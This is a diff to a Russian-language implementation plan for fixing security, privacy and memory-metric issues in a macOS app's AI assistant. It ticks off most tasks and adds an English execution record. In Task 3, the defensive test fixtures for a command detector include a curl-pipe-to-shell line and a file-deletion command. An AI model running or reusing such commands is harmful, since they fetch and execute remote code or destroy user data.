@@ -50,11 +50,12 @@
 
 **Interfaces:** `AssistantEndpointIdentity: Equatable, Sendable` с `init(settings: AssistantSettings)`; для текущей политики identity = provider + нормализованный host, при некорректном URL — полный trimmed URL. `@Observable @MainActor AssistantSettingsEditor` владеет draft/key/models/status и методами `updateSettings(_:)`, `updateAPIKey(_:)`, `loadModels() async`, `check() async`, `reset()`. Сеть — injected closures тех же сигнатур, что `AssistantViewModel.fetchModels`/`checkConnection`; UI остаётся тонким.
 
-- [ ] Добавить `testUnsavedKeyDoesNotFollowAnotherHost`: saved A/key-A → B → key-B → C; fake check и models получают пустой ключ, подготовка Save тоже; возврат к A восстанавливает только key-A.
-- [ ] Добавить `testEditedDraftIgnoresLateProbeResult`: приостановить A, изменить provider/URL/model на B, закончить A; B не получает ни моделей A, ни зелёного статуса. Вторая операция должна побеждать первую и при обратном порядке ответов. Reset инвалидирует операции.
-- [ ] Запустить `scripts/test.sh AssistantSettingsEditorTests`, убедиться, что новые сценарии не проходят до реализации.
-- [ ] Реализовать привязку введённого ключа к identity, заменить Boolean `.onChange`. Результаты операций применять только при совпадении generation и снимка draft; изменения полей инвалидируют старый status. Каждый запрос берёт неизменяемые draft/key перед `await`.
-- [ ] Повторить тесты вместе с `AssistantSettingsTests LLMClientFactoryTests`; вручную проверить изменение URL в поле без Save. Создать commit `fix(assistant): bind settings credentials and probes to endpoint`.
+- [x] Добавить `testUnsavedKeyDoesNotFollowAnotherHost`: saved A/key-A → B → key-B → C; fake check и models получают пустой ключ, подготовка Save тоже; возврат к A восстанавливает только key-A.
+- [x] Добавить `testEditedDraftIgnoresLateProbeResult`: приостановить A, изменить provider/URL/model на B, закончить A; B не получает ни моделей A, ни зелёного статуса. Вторая операция должна побеждать первую и при обратном порядке ответов. Reset инвалидирует операции.
+- [x] Запустить `scripts/test.sh AssistantSettingsEditorTests`, убедиться, что новые сценарии не проходят до реализации.
+- [x] Реализовать привязку введённого ключа к identity, заменить Boolean `.onChange`. Результаты операций применять только при совпадении generation и снимка draft; изменения полей инвалидируют старый status. Каждый запрос берёт неизменяемые draft/key перед `await`.
+- [x] Повторить тесты вместе с `AssistantSettingsTests LLMClientFactoryTests`; commit `e343594`.
+- [ ] Вручную проверить изменение URL в поле без Save — GUI input blocked (`window_not_focused`); exact binding regression passes.
 
 ### Task 2: Атомарный контекст запроса (R02)
 
@@ -62,10 +63,10 @@
 
 **Interfaces:** private `ResponseConfiguration { let settings: AssistantSettings; let apiKey: String }`; `respond(into: UUID, configuration: ResponseConfiguration) async`. Внешние Dependencies не расширяются.
 
-- [ ] Добавить `testSettingsChangeDuringRefreshDoesNotMixCredentials`: suspend refresh → сохранить B/key-B → resume; `makeClient` получает строго A/key-A. Следующий запрос получает B/key-B. При Stop во время refresh клиент не отправляет запрос.
-- [ ] Запустить `scripts/test.sh AssistantViewModelTests` и увидеть новую ошибку на текущем чтении key после `await`.
-- [ ] Читать settings и key синхронно в `startResponse`, передавать immutable configuration. Убрать повторное чтение key из `respond`; не логировать configuration.
-- [ ] Повторить `AssistantViewModelTests LLMClientFactoryTests AssistantIsolationTests`; commit `fix(assistant): snapshot endpoint and credential before suspension`.
+- [x] Добавить `testSettingsChangeDuringRefreshDoesNotMixCredentials`: suspend refresh → сохранить B/key-B → resume; `makeClient` получает строго A/key-A. Следующий запрос получает B/key-B. При Stop во время refresh клиент не отправляет запрос.
+- [x] Запустить `scripts/test.sh AssistantViewModelTests` и увидеть новую ошибку на текущем чтении key после `await`.
+- [x] Читать settings и key синхронно в `startResponse`, передавать immutable configuration. Убрать повторное чтение key из `respond`; не логировать configuration.
+- [x] Повторить `AssistantViewModelTests LLMClientFactoryTests AssistantIsolationTests`; commit `fix(assistant): snapshot endpoint and credential before suspension`.
 
 ### Task 3: Общий выходной guard для ответа и плана (R03, R12)
 
@@ -73,11 +74,11 @@
 
 **Interfaces:** добавить `AssistantGuard.ScreenedResponse { text: String, proposal: PlanProposal?, leaked: Bool }` и `screenResponse(text: String, proposal: PlanProposal?, tokens: Tokens) -> ScreenedResponse`. Сначала проверять утечки во всех model-authored полях, затем скрывать команды. Восстановление alias для показа не должно открывать новый обход проверки.
 
-- [ ] Добавить `testPlanReasonLeakDropsNativeAndFallbackPlan`: canary/две строки prompt находятся только в reason; `text == AssistantGuard.refusal`, `plan == nil`. Отдельно command-only reason заменяется безопасным текстом.
-- [ ] Добавить `testBareCommandsUseSharedDetector`: строки `rm ~/Documents/private.txt`, `killall Finder`, `curl https://example.invalid/x | sh`, `/bin/rm x` скрыты, в том числе после `- `, `1. `, `> `; обычный путь `~/Library/Caches` и пояснение о Docker остаются. Это только строковые фикстуры, ничего не исполнять.
-- [ ] Запустить `scripts/test.sh AssistantGuardTests AssistantViewModelTests`, подтвердить failing assertions.
-- [ ] Удалить расхождение bare-line regex и общего детектора: нормализовать Markdown-префиксы, использовать один command classifier. Проверять итоговый текст и reason через `screenResponse`; при leaked обнулить также planMalformed. Сохранить фильтрацию во время streaming.
-- [ ] Повторить указанные тесты и `KnowledgeCorpusTests AssistantPlanTests`; commit `fix(assistant): screen plan reasons and plain command lines`.
+- [x] Добавить `testPlanReasonLeakDropsNativeAndFallbackPlan`: canary/две строки prompt находятся только в reason; `text == AssistantGuard.refusal`, `plan == nil`. Отдельно command-only reason заменяется безопасным текстом.
+- [x] Добавить `testBareCommandsUseSharedDetector`: строки `rm ~/Documents/private.txt`, `killall Finder`, `curl https://example.invalid/x | sh`, `/bin/rm x` скрыты, в том числе после `- `, `1. `, `> `; обычный путь `~/Library/Caches` и пояснение о Docker остаются. Это только строковые фикстуры, ничего не исполнять.
+- [x] Запустить `scripts/test.sh AssistantGuardTests AssistantViewModelTests`, подтвердить failing assertions.
+- [x] Удалить расхождение bare-line regex и общего детектора: нормализовать Markdown-префиксы, использовать один command classifier. Проверять итоговый текст и reason через `screenResponse`; при leaked обнулить также planMalformed. Сохранить фильтрацию во время streaming.
+- [x] Повторить указанные тесты и `KnowledgeCorpusTests AssistantPlanTests`; commit `fix(assistant): screen plan reasons and plain command lines`.
 
 ### Task 4: Структурированный focus для row shortcuts (R04)
 
@@ -85,11 +86,11 @@
 
 **Interfaces:** сделать `AssistantFocus` Codable; добавить `AssistantMessage.focus: AssistantFocus?` с backward-compatible декодированием. `wireHistory(excluding:redacts:tokens:)` ограждает структурированный focus текущими tokens; fixed question хранится отдельно от title/path/facts.
 
-- [ ] Добавить `testRowFocusIsFencedOnSendRetryAndReload`: title/facts содержат newline, U+202E и поддельный closing tag. В исходящем request вопрос находится вне fence, все метаданные — внутри, bidi удалён, поддельная граница обезврежена.
-- [ ] Добавить кейсы cloud disclosure и ask во время streaming: ожидание/повтор не должны терять provenance focus. Если focus переносится в composer, хранить его отдельно от редактируемого вопроса до Send/явного снятия focus.
-- [ ] Запустить `scripts/test.sh AssistantViewModelTests ConversationStoreTests` и зафиксировать failing сценарии.
-- [ ] Передавать focus структурированно через pending send, retry, историю; до fencing применять cloud redaction. В bubble локально собирать читаемый вопрос и карточку focus, не превращая результат отображения обратно в wire instructions. Старый JSON без focus продолжает открываться, миграционная политика outbound истории определяется Task 5.
-- [ ] Проверить тесты, включая local refusal и отсутствие скрытого запроса у ненастроенного ассистента; commit `fix(assistant): preserve untrusted row context through conversation`.
+- [x] Добавить `testRowFocusIsFencedOnSendRetryAndReload`: title/facts содержат newline, U+202E и поддельный closing tag. В исходящем request вопрос находится вне fence, все метаданные — внутри, bidi удалён, поддельная граница обезврежена.
+- [x] Добавить кейсы cloud disclosure и ask во время streaming: ожидание/повтор не должны терять provenance focus. Если focus переносится в composer, хранить его отдельно от редактируемого вопроса до Send/явного снятия focus.
+- [x] Запустить `scripts/test.sh AssistantViewModelTests ConversationStoreTests` и зафиксировать failing сценарии.
+- [x] Передавать focus структурированно через pending send, retry, историю; до fencing применять cloud redaction. В bubble локально собирать читаемый вопрос и карточку focus, не превращая результат отображения обратно в wire instructions. Старый JSON без focus продолжает открываться, миграционная политика outbound истории определяется Task 5.
+- [x] Проверить тесты, включая local refusal и отсутствие скрытого запроса у ненастроенного ассистента; commit `fix(assistant): preserve untrusted row context through conversation`.
 
 ### Task 5: Безопасная история после перезапуска (R11)
 
@@ -97,11 +98,11 @@
 
 **Interfaces:** добавить optional `AssistantMessage.outboundSafeText: String?`, default nil для старого JSON. `text` остаётся локальным отображаемым текстом. Безопасное wire-представление фиксируется до `restore`; при replay alias старых сообщений получают отдельное пространство имён, например `<история-M-папка-N>` (M — UUID сообщения), которое не восстанавливается текущей alias map.
 
-- [ ] Добавить `testRestartDoesNotExposeRestoredProjectNames`: cloud answer с alias → persist → новая VM с пустым/другим снимком → новый запрос; ни одно wire message не содержит `secret-client`, исходный home или зарегистрированный secret root.
-- [ ] Добавить `testHistoricalAliasesCannotReferToNewSnapshotFolders`: старый и новый snapshot используют `<папка-1>` для разных папок; replay не смешивает идентичности. Проверить legacy JSON без safe text и переключение local → cloud.
-- [ ] Запустить `scripts/test.sh PathRedactorTests ConversationStoreTests AssistantViewModelTests`, подтвердить регрессии.
-- [ ] Разделить display и outbound text. Для off-device replay предпочитать только сохранённое безопасное представление; старую/локальную историю без доказуемо безопасного представления не пересылать автоматически, оставить её видимой и показать notice об ограниченном контексте. Не сохранять alias map. Новые user/focus сообщения получают safe representation при подготовке отправки; cloud model response — до восстановления имён.
-- [ ] Повторить тесты приватности, включая redaction в tool output и knowledge injection; commit `fix(assistant): persist a safe outbound conversation representation`.
+- [x] Добавить `testRestartDoesNotExposeRestoredProjectNames`: cloud answer с alias → persist → новая VM с пустым/другим снимком → новый запрос; ни одно wire message не содержит `secret-client`, исходный home или зарегистрированный secret root.
+- [x] Добавить `testHistoricalAliasesCannotReferToNewSnapshotFolders`: старый и новый snapshot используют `<папка-1>` для разных папок; replay не смешивает идентичности. Проверить legacy JSON без safe text и переключение local → cloud.
+- [x] Запустить `scripts/test.sh PathRedactorTests ConversationStoreTests AssistantViewModelTests`, подтвердить регрессии.
+- [x] Разделить display и outbound text. Для off-device replay предпочитать только сохранённое безопасное представление; старую/локальную историю без доказуемо безопасного представления не пересылать автоматически, оставить её видимой и показать notice об ограниченном контексте. Не сохранять alias map. Новые user/focus сообщения получают safe representation при подготовке отправки; cloud model response — до восстановления имён.
+- [x] Повторить тесты приватности, включая redaction в tool output и knowledge injection; commit `fix(assistant): persist a safe outbound conversation representation`.
 
 Изменение политики legacy/local истории намеренное: сохранение контекста не должно раскрывать имена, которые приложение обещало скрывать. Новое поведение и notice описать в спецификации; не объявлять regex способным восстановить утраченную provenance.
 
@@ -111,11 +112,11 @@
 
 **Interfaces:** существующие `ConversationStore.save(_:)`/`load()` сохраняются. Private checkpoint helper использует `Dependencies.now` и интервал **1 секунда**, сохраняет screened display text и безопасное outbound представление вместе.
 
-- [ ] Добавить `testOpenStreamCanBeRestoredAsInterrupted`: fake stream не заканчивается; сразу после Send store содержит user + streaming placeholder; после checkpoint partial text восстанавливается, статус `.interrupted`, Retry доступен.
-- [ ] Добавить `testCheckpointCannotResurrectClearedConversation`: Новый диалог после partial text; поздний checkpoint/отмена старого ответа не возвращают сообщения. Проверить Stop до первого token.
-- [ ] Запустить целевые VM/store tests и подтвердить падение до исправления.
-- [ ] Сохранять начало обмена до запуска Task; checkpoint не чаще раза в секунду при поступлении текста, final/Stop сохранять немедленно. Не записывать raw transcript, tool arguments, canary или ключи в обход guard. Привязать checkpoint к message ID/generation.
-- [ ] Повторить VM/store/isolation tests; commit `fix(assistant): checkpoint in-flight conversations`.
+- [x] Добавить `testOpenStreamCanBeRestoredAsInterrupted`: fake stream не заканчивается; сразу после Send store содержит user + streaming placeholder; после checkpoint partial text восстанавливается, статус `.interrupted`, Retry доступен.
+- [x] Добавить `testCheckpointCannotResurrectClearedConversation`: Новый диалог после partial text; поздний checkpoint/отмена старого ответа не возвращают сообщения. Проверить Stop до первого token.
+- [x] Запустить целевые VM/store tests и подтвердить падение до исправления.
+- [x] Сохранять начало обмена до запуска Task; checkpoint не чаще раза в секунду при поступлении текста, final/Stop сохранять немедленно. Не записывать raw transcript, tool arguments, canary или ключи в обход guard. Привязать checkpoint к message ID/generation.
+- [x] Повторить VM/store/isolation tests; commit `fix(assistant): checkpoint in-flight conversations`.
 
 ### Task 7: Семантика замены плана (R08)
 
@@ -123,11 +124,11 @@
 
 **Interfaces:** `enum PlanUpdate: Equatable, Sendable { case unchanged; case replace(PlanProposal) }`; заменить неоднозначное `ToolOutcome.proposal` на `planUpdate`. Сохранить факт успешного native proposal отдельно от наличия meaningful card, чтобы пустая native замена не оживляла старый fallback.
 
-- [ ] Добавить `testEmptyNativeReplacementRemovesPreviousPlan`: c1 → валидный empty proposal → текст «План пуст»; итоговый `message.plan == nil`. Проверить также empty replacement + старый fallback block.
-- [ ] Добавить проверки nonempty → nonempty (последний побеждает), lookup после плана (не меняет), невалидный JSON (не считается успешной заменой).
-- [ ] Запустить `scripts/test.sh AssistantToolboxTests AssistantViewModelTests` и увидеть падение нового кейса.
-- [ ] Возвращать `.replace` для каждого успешно разобранного `propose_plan`, включая пустой; `.unchanged` для остальных инструментов и parse errors. Перед отображением разрешать только последнее предложение и применять Task 3 guard.
-- [ ] Повторить toolbox/VM/plan/isolation tests; commit `fix(assistant): honor empty replacement plans`.
+- [x] Добавить `testEmptyNativeReplacementRemovesPreviousPlan`: c1 → валидный empty proposal → текст «План пуст»; итоговый `message.plan == nil`. Проверить также empty replacement + старый fallback block.
+- [x] Добавить проверки nonempty → nonempty (последний побеждает), lookup после плана (не меняет), невалидный JSON (не считается успешной заменой).
+- [x] Запустить `scripts/test.sh AssistantToolboxTests AssistantViewModelTests` и увидеть падение нового кейса.
+- [x] Возвращать `.replace` для каждого успешно разобранного `propose_plan`, включая пустой; `.unchanged` для остальных инструментов и parse errors. Перед отображением разрешать только последнее предложение и применять Task 3 guard.
+- [x] Повторить toolbox/VM/plan/isolation tests; commit `fix(assistant): honor empty replacement plans`.
 
 ### Task 8: Проверка экземпляра приложения перед завершением (R05)
 
@@ -135,11 +136,11 @@
 
 **Interfaces:** `RunningAppIdentity: Equatable, Sendable { pid: pid_t, bundlePath: String, bundleIdentifier: String?, launchDate: Date }`; `RunningAppInfo.launchDate: Date?`. `AppTerminator` принимает проверенные identity вместо `[pid_t]`; live implementation сверяет identity у полученного `NSRunningApplication` перед terminate/forceTerminate. Если launch identity недоступна, действие запрещается с объяснением.
 
-- [ ] Добавить ordinary/force tests для PID reuse: после подтверждения Slack заменить PID42 на Finder; число вызовов terminator для replacement равно **0**. Повторить для нового экземпляра Slack с другой launchDate.
-- [ ] Проверить неизменившуюся разрешённую цель, уже закрытое приложение, недоступную identity и исчезновение между обычным quit и force offer. Сохранить существующие protected-app/UID проверки.
-- [ ] Запустить `scripts/test.sh MemoryViewModelTests ProcessSafetyRulesTests`, подтвердить падение reuse кейсов.
-- [ ] Захватывать vetted identities; live layer повторно сверяет bundle/launchDate непосредственно перед действием и использует тот же проверенный app object. Не заменять проверку существованием числового PID. Waiting отслеживает исходный экземпляр, а не его преемника.
-- [ ] Повторить целевые тесты и `AssistantIsolationTests`; commit `fix(memory): bind quit approval to application instance`.
+- [x] Добавить ordinary/force tests для PID reuse: после подтверждения Slack заменить PID42 на Finder; число вызовов terminator для replacement равно **0**. Повторить для нового экземпляра Slack с другой launchDate.
+- [x] Проверить неизменившуюся разрешённую цель, уже закрытое приложение, недоступную identity и исчезновение между обычным quit и force offer. Сохранить существующие protected-app/UID проверки.
+- [x] Запустить `scripts/test.sh MemoryViewModelTests ProcessSafetyRulesTests`, подтвердить падение reuse кейсов.
+- [x] Захватывать vetted identities; live layer повторно сверяет bundle/launchDate непосредственно перед действием и использует тот же проверенный app object. Не заменять проверку существованием числового PID. Waiting отслеживает исходный экземпляр, а не его преемника.
+- [x] Повторить целевые тесты и `AssistantIsolationTests`; commit `fix(memory): bind quit approval to application instance`.
 
 ### Task 9: Неизвестные показатели памяти (R06)
 
@@ -147,11 +148,11 @@
 
 **Interfaces:** добавить `MemoryMetricAvailability: Equatable, Sendable { pages: Bool, swap: Bool }` в `SystemMemorySnapshot` и переносить эти признаки в read-only `MemoryInfo` без ссылки на Memory API. Pressure `.unknown` уже существует. Числовые свойства сохранить для совместимости, но никогда не интерпретировать недоступные значения как измеренные. History points с недоступной метрикой должны создавать пробел соответствующего ряда.
 
-- [ ] Добавить независимые failure fixtures для pages/swap/pressure. Assert: unavailable fields отображаются/рендерятся как «—»/«данные не получены»; `.unknown` без достаточных свидетельств не даёт «Памяти достаточно».
-- [ ] Проверить нормальный pressure и настоящий swap=0; ненулевой достоверный swap/critical pressure при частично недоступных метриках не скрывают реальную нагрузку. История не рисует падение к нулю при ошибке.
-- [ ] Запустить memory/snapshot tests, подтвердить ошибки новых кейсов.
-- [ ] Сохранять availability в reader, применять её в verdict, UI, dashboard и assistant renderer/advisor. Добавить injectable pure conversion для nil pages/swap, чтобы тест не зависел от настоящего отказа sysctl. Уточнить противоречие спецификации «missing values become 0» против «show —».
-- [ ] Повторить memory/snapshot/staging tests и build; commit `fix(memory): distinguish unavailable metrics from zero`.
+- [x] Добавить независимые failure fixtures для pages/swap/pressure. Assert: unavailable fields отображаются/рендерятся как «—»/«данные не получены»; `.unknown` без достаточных свидетельств не даёт «Памяти достаточно».
+- [x] Проверить нормальный pressure и настоящий swap=0; ненулевой достоверный swap/critical pressure при частично недоступных метриках не скрывают реальную нагрузку. История не рисует падение к нулю при ошибке.
+- [x] Запустить memory/snapshot tests, подтвердить ошибки новых кейсов.
+- [x] Сохранять availability в reader, применять её в verdict, UI, dashboard и assistant renderer/advisor. Добавить injectable pure conversion для nil pages/swap, чтобы тест не зависел от настоящего отказа sysctl. Уточнить противоречие спецификации «missing values become 0» против «show —».
+- [x] Повторить memory/snapshot/staging tests и build; commit `fix(memory): distinguish unavailable metrics from zero`.
 
 ### Task 10: Восстановление domain runner и ясный test gate (R09)
 
@@ -159,11 +160,11 @@
 
 **Interfaces:** перенести чистую функцию в `AssistantMarkdownBlocks.inline(_ text: String) -> AttributedString`, View делегирует ей. Сохраняются emphasis и отсутствие активных ссылок.
 
-- [ ] Зафиксировать текущий fail: `python3 scripts/test-domain.py` → `cannot find 'AssistantMarkdownView' in scope`.
-- [ ] Перенести inline преобразование в domain-файл и обновить тест без исключений из runner. Проверки результата: `String(result.characters) == "сайт и важно"`, `result.runs.allSatisfy { $0.link == nil }`, strong emphasis сохранён.
-- [ ] Запустить полный domain runner, затем `scripts/test.sh AssistantMarkdownBlocksTests` и Debug build. Commit `fix(tests): keep markdown transformation tests in domain target`.
-- [ ] Отдельно воспроизвести `SmartCareLifecycleTests` с fake `sampleSpace`, чтобы убрать реальное измерение тома из lifecycle-тестов. Заменить лимит `1_000 Task.yield()` на завершение управляемой async-операции/expectation с явным тайм-аутом **5 секунд**. Не менять production license/cleanup поведение ради тестов.
-- [ ] Запустить изолированный lifecycle suite и полный Xcode suite. Если сбой остаётся, сохранить диагностические данные и расследовать фактический lifecycle; не списывать его на flaky без доказательств. Исправление тестовой синхронизации — отдельный commit.
+- [x] Зафиксировать текущий fail: `python3 scripts/test-domain.py` → `cannot find 'AssistantMarkdownView' in scope`.
+- [x] Перенести inline преобразование в domain-файл и обновить тест без исключений из runner. Проверки результата: `String(result.characters) == "сайт и важно"`, `result.runs.allSatisfy { $0.link == nil }`, strong emphasis сохранён.
+- [x] Запустить полный domain runner, затем `scripts/test.sh AssistantMarkdownBlocksTests` и Debug build. Commit `fix(tests): keep markdown transformation tests in domain target`.
+- [x] Отдельно воспроизвести `SmartCareLifecycleTests` с fake `sampleSpace`, чтобы убрать реальное измерение тома из lifecycle-тестов. Заменить лимит `1_000 Task.yield()` на завершение управляемой async-операции/expectation с явным тайм-аутом **5 секунд**. Не менять production license/cleanup поведение ради тестов.
+- [x] Запустить изолированный lifecycle suite и полный Xcode suite. Если сбой остаётся, сохранить диагностические данные и расследовать фактический lifecycle; не списывать его на flaky без доказательств. Исправление тестовой синхронизации — отдельный commit.
 
 ### Task 11: Сбалансировать Mach host port (I01, P3)
 
@@ -171,9 +172,9 @@
 
 **Interfaces:** `SystemMemoryReader.current()` остаётся прежним. В `readPages()` один локальный `host = mach_host_self()`, соответствующий `mach_port_deallocate(mach_task_self_, host)` через `defer` на всех путях выхода.
 
-- [ ] До изменения измерить user references через `mach_port_get_refs` вокруг 10 вызовов `current()` в отдельном временном probe; ожидать текущий прирост **10**.
-- [ ] Сбалансировать владение портом без изменения formulas/pressure/swap.
-- [ ] Повторить probe: ожидать нулевой прирост; `scripts/test.sh SystemMemoryReaderTests`. Постоянный live-тест счётчика в параллельный suite не добавлять: чужие замеры могут менять счётчик. Commit `fix(memory): release sampled host port send right`.
+- [x] До изменения измерить user references через `mach_port_get_refs` вокруг 10 вызовов `current()` в отдельном временном probe; ожидать текущий прирост **10**.
+- [x] Сбалансировать владение портом без изменения formulas/pressure/swap.
+- [x] Повторить probe: ожидать нулевой прирост; `scripts/test.sh SystemMemoryReaderTests`. Постоянный live-тест счётчика в параллельный suite не добавлять: чужие замеры могут менять счётчик. Commit `fix(memory): release sampled host port send right`.
 
 ### Task 12: Спецификации и завершающая проверка
 
@@ -181,11 +182,11 @@
 
 **Interfaces:** security contract с матрицей «источник → trust level → redaction → fencing → output guard → regression test». Не заявлять абсолютную jailbreak-защиту.
 
-- [ ] Согласовать tool/dependency counts с кодом, добавить правило 6 в AGENTS, описать новые identity/availability/history semantics и миграцию. Связать каждый R01–R12 с его тестом; I01 — с probe.
-- [ ] Запустить `python3 scripts/test-domain.py`, полный `scripts/test.sh`, Debug build. Зафиксировать SHA, среду, число тестов и результат; все gates должны пройти до заявления «готово к выпуску».
+- [x] Согласовать tool/dependency counts с кодом, добавить правило 6 в AGENTS, описать новые identity/availability/history semantics и миграцию. Связать каждый R01–R12 с его тестом; I01 — с probe.
+- [x] Запустить `python3 scripts/test-domain.py`, полный `scripts/test.sh`, Debug build. Зафиксировать SHA, среду, число тестов и результат; все gates должны пройти до заявления «готово к выпуску».
 - [ ] Выполнить существующий manual checklist для Ollama Cloud/local/tool-less/LM Studio, дополнив переключением endpoint во время запроса, восстановлением истории, row focus и пустой заменой плана. Для облачных проверок использовать синтетические данные; не писать ключи в логи.
 - [ ] На тестовом приложении без несохранённых документов проверить quit/force confirmation и сравнить показатели с Activity Monitor. Указать проверенные macOS версии, не распространять результат на непроверенные.
-- [ ] Сохранить evidence и обновить статусы checklist только для реально выполненных пунктов; commit `docs: reconcile assistant security and memory release checks`.
+- [x] Сохранить evidence и обновить статусы checklist только для реально выполненных пунктов; commit `docs: reconcile assistant security and memory release checks`.
 
 ### Task 13: Актуальные корни обезличивания (улучшение после основных исправлений)
 
@@ -193,10 +194,10 @@
 
 **Interfaces:** добавить узкую read-only dependency `personalRootsProvider: @MainActor () -> [String]`; `PathRedactor.updateExtraRoots(_ roots: [String])` сохраняет уже выделенные alias. Обновить точный allowlist dependency labels в isolation-тесте, не его forbidden tokens.
 
-- [ ] Добавить `testNewProjectRootIsRedactedWithoutRestart`: создать VM, зарегистрировать `/Volumes/External/clients`, следующий fake cloud request не содержит root/client name. Старые alias остаются стабильными; удалённый root не раскрывает старую историю.
-- [ ] Запустить соответствующие тесты и подтвердить текущее отсутствие новых корней.
-- [ ] Обновлять набор roots перед подготовкой snapshot/history каждого ответа; получать только value data извне Assistant, не ссылку на registry/scan VM. Политику для удалённых корней выбрать консервативно: уже известные приватные names остаются скрытыми до нового диалога.
-- [ ] Повторить redaction/VM/isolation tests и обновить спецификацию, убрав «apply after next launch»; commit `fix(assistant): refresh privacy roots before requests`.
+- [x] Добавить `testNewProjectRootIsRedactedWithoutRestart`: создать VM, зарегистрировать `/Volumes/External/clients`, следующий fake cloud request не содержит root/client name. Старые alias остаются стабильными; удалённый root не раскрывает старую историю.
+- [x] Запустить соответствующие тесты и подтвердить текущее отсутствие новых корней.
+- [x] Обновлять набор roots перед подготовкой snapshot/history каждого ответа; получать только value data извне Assistant, не ссылку на registry/scan VM. Политику для удалённых корней выбрать консервативно: уже известные приватные names остаются скрытыми до нового диалога.
+- [x] Повторить redaction/VM/isolation tests и обновить спецификацию, убрав «apply after next launch»; commit `fix(assistant): refresh privacy roots before requests`.
 
 ## Критерии готовности
 
@@ -205,3 +206,12 @@
 - Quit не касается нового владельца PID; недоступные показатели не изображают здоровую систему.
 - Оба автоматических runner проходят полностью. Ручные проверки содержат фактические результаты и ограничения.
 - Изменения в production-коде ещё не выполнялись: этот документ — план последующей реализации, не отчёт об исправлениях.
+
+
+## Execution record (2026-10-04)
+
+Code changes are implemented on `fix/memory-assistant-review` in `.worktrees/review-fixes`. [Verification report](../reviews/2026-10-04-memory-assistant-fixes-verification.md) is the source of actual test counts and pending live checks. Planned test names may differ where equivalent scenarios are combined; the security contract maps implemented names.
+
+Independent units have separate commits. Tasks2–7/13 share response/history state and Codable/tool interfaces and were delivered together in `e1a18e3`, followed by planned coverage in `f6dde5f`; this avoids broken intermediate commits. Their individual reports/evidence remain in `.superpowers/sdd/2026-10-04-memory-assistant-review-fixes/`. Review caught additional safe-history retry, cancelled fallback, privacy-policy replay and alias overlap/migration cases; each was reproduced and corrected.
+
+Manual provider GUI checks, disposable-app quit/force confirmation and Activity Monitor comparison remain unchecked. Automated gates do not imply release readiness on untested macOS versions or live cloud servers.
